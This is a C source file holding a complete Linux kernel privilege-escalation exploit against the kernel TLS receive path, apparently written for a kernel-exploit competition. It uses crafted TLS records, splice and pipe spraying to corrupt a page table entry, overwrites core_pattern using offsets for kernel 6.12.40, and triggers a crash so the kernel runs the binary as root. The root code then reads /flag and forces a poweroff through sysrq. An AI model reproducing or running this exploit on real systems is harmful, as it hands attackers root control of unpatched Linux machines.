#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/msg.h>
#include <sched.h>
#include <sys/wait.h>
#include <unistd.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/sendfile.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <err.h>
#include <linux/tls.h>
#define SYSCHK(x) ({              \
	typeof(x) __res = (x);        \
	if (__res == (typeof(x))-1)   \
		err(1, "SYSCHK(" #x ")"); \
	__res;                        \
})

#define PAUSE           \
	{                   \
		int x;          \
		printf(":");    \
		read(0, &x, 1); \
	}
#define PORT 4444

void set_cpu(int i)
{
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(i, &mask);
	sched_setaffinity(0, sizeof(mask), &mask);
}

void setup_tls(int sock)
{
	struct tls12_crypto_info_aes_ccm_128 crypto = {0};
	crypto.info.version = TLS_1_2_VERSION;
	crypto.info.cipher_type = TLS_CIPHER_AES_CCM_128;
	SYSCHK(setsockopt(sock, SOL_TCP, TCP_ULP, "tls", sizeof("tls")));
	SYSCHK(setsockopt(sock, SOL_TLS, TLS_RX, &crypto, sizeof(crypto)));
}

void crash(char *cmd)
{
	int memfd = memfd_create("", 0);
	SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
	dup2(memfd, 666);
	close(memfd);
	puts("Root shell !!");
	/* Trigger program crash and cause kernel to executes program from core_pattern which is our "root" binary */
	*(size_t *)0 = 0;
}

char buf[0x100000];
char buf2[0x10000];
int sprayfd[0x100][0x2];
int sprayfd2[0x100][0x2];
int pfds[0x80][2];
char *addrs[0x1000];
int main(int argc, char **argv)
{

	if (argc > 1)
	{

		// This section of code will be execute by root!
		int pid = strtoull(argv[1], 0, 10);
		int pfd = syscall(SYS_pidfd_open, pid, 0);
		int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
		int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
		int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
		dup2(stdinfd, 0);
		dup2(stdoutfd, 1);
		dup2(stderrfd, 2);
		/* Get flag and poweroff immediately to boost next round try in PR verification workflow*/
		system("cat /flag; sleep 1; echo o>/proc/sysrq-trigger");
		exit(0);
	}
	int listener, conn, client;
	struct sockaddr_in addr = {0};

	char *maddr = (void *)0x200000;
	for (int i = 0; i < 0x100; i++)
		addrs[i] = SYSCHK(mmap(maddr + 0x200000 * i, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0));
	for (int i = 0; i < 0x80; i++)
	{
		pipe(pfds[i]);
	}

	socklen_t len = sizeof(addr);
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	set_cpu(0);

	// === Setup listener ===
	listener = socket(AF_INET, SOCK_STREAM, 0);
	if (listener < 0)
	{
		perror("socket listener");
		exit(1);
	}

	addr.sin_family = AF_INET;
	addr.sin_port = htons(PORT);
	// inet_pton(AF_INET, "127.0.0.4", &addr.sin_addr);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	int optval = 1;
	if (setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0)
	{
		perror("setsockopt SO_REUSEADDR failed");
		// Handle error
	}
	if (bind(listener, (struct sockaddr *)&addr, sizeof(addr)) < 0)
	{
		perror("bind");
		exit(1);
	}
	if (listen(listener, 1) < 0)
	{
		perror("listen");
		exit(1);
	}

	// === Setup client and connect immediately ===
	client = socket(AF_INET, SOCK_STREAM, 0);
	if (client < 0)
	{
		perror("socket client");
		exit(1);
	}

	if (connect(client, (struct sockaddr *)&addr, sizeof(addr)) < 0)
	{
		perror("connect");
		exit(1);
	}

	printf("[*] Client connected to server\n");

	// === Accept on server side (non-blocking because client already connected) ===
	conn = accept(listener, NULL, 0);
	if (conn < 0)
	{
		perror("accept");
		exit(1);
	}
	printf("[*] Server accepted connection\n");

	int pfd[2];
	pipe(pfd);

	for (int i = 0; i < 0x100; i++)
	{
		sprayfd[i][0] = socket(AF_INET, SOCK_STREAM, 0);
		connect(sprayfd[i][0], (struct sockaddr *)&addr, sizeof(addr));
		sprayfd[i][1] = accept(listener, 0, 0);
	}
	int dummy_serv = socket(AF_INET, SOCK_STREAM, 0);
	connect(dummy_serv, (struct sockaddr *)&addr, sizeof(addr));
	int dummy_cli = accept(listener, 0, 0);

	setup_tls(conn);

	unsigned char tls_record[] = {
		0x17, 0x03, 0x03, 0x00, 0x23, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x26, 0xa2, 0x33, 0xde, 0x8d, 0x94, 0xf0, 0x29, 0x6c, 0xb1, 0xaf,
		0x6a, 0x75, 0xb2, 0x93, 0xad, 0x45, 0xd5, 0xfd, 0x03, 0x51, 0x57, 0x8f,
		0xf9, 0xcc, 0x3b, 0x42};
	unsigned char hello_request_record[] = {
		0x16, 0x03, 0x03, 0x00, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x01, 0x3e, 0xf0, 0xfe, 0xee, 0xd9, 0xe2, 0x5d, 0xc7, 0x11, 0x4c, 0xe6,
		0xb4, 0x7e, 0xef, 0x40, 0x2b

	};
	unsigned char tls_record_3[] = {
		0x17, 0x03, 0x03, 0x00, 0x23, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x02, 0xe5, 0x3d, 0x19, 0x3d, 0xca, 0xb8, 0x16, 0xb6, 0xff, 0x79, 0x87,
		0x8e, 0xa1, 0xd0, 0xcd, 0x33, 0xb5, 0x86, 0x2b, 0x17, 0xf1, 0x52, 0x2a,
		0x55, 0x62, 0x65, 0x11};
	write(pfd[1], tls_record_3, sizeof(tls_record_3));
	write(pfd[1], buf, 0x800);

	write(client, tls_record, sizeof(tls_record));

	write(client, hello_request_record, sizeof(hello_request_record));

	int n = read(conn, buf, 0x100);
	write(dummy_serv, buf, 1);
	splice(pfd[0], 0, client, 0, sizeof(tls_record_3), 0);

	write(dummy_cli, buf, 1);

#define CONTROL_LEN 1024
#define BUF_LEN 4096

	char data[BUF_LEN];
	char control[CONTROL_LEN];

	struct iovec iov = {
		.iov_base = data,
		.iov_len = sizeof(data),
	};

	struct msghdr lmsg = {
		.msg_name = NULL,
		.msg_namelen = 0,
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = control,
		.msg_controllen = sizeof(control),
		.msg_flags = 0,
	};

	close(pfd[0]);
	close(pfd[1]);
	int pfd2[2];
	pipe(pfd2);

	n = recvmsg(conn, &lmsg, 0);

	printf("splice %ld\n", splice(conn, 0, pfd2[1], 0, 1, 0));

	memset(buf, 'X', 0x1000);
	for (int i = 0; i < 0x80; i++)
	{
		write(pfds[i][1], buf, 0x1000);
	}
	int x;
//	PAUSE;
	read(pfd2[0], &x, 1);

	printf("crash? %c\n", x);
//	PAUSE;
	int sum = 0;
	for (int i = 0; i < 0x100; i++)
		sum += addrs[i][0];
	printf("Sum %d\n", sum);

	int *tpfd;
	for (int i = 0; i < 0x80; i++)
	{
		read(pfds[i][0], buf, 0x1000);
		if (buf[0] != 'X')
		{
			tpfd = pfds[i];
			printf("pte? %zx\n", *(size_t*)buf);
			break;
		}
	}

// LTS 6.12.40
#define ZERO_OFFSET 0x410e000
#define CORE_PATTERN 0x320abe0

	size_t pa = *(size_t *)&buf[0];
	pa &= 0xfffffffff000;
	pa += 0x867;
	pa -= ZERO_OFFSET;
	pa += (CORE_PATTERN & (~0xfff));
	int offset = CORE_PATTERN & (0xfff);

	write(tpfd[1], &pa, 8);
	for (int i = 0; i < 0x100; i++)
		strcpy(&addrs[i][offset], "|/proc/%P/fd/666 %P");

	if(fork()==0) {
		setsid();
		crash("");
	}
	PAUSE;

	return 0;
}

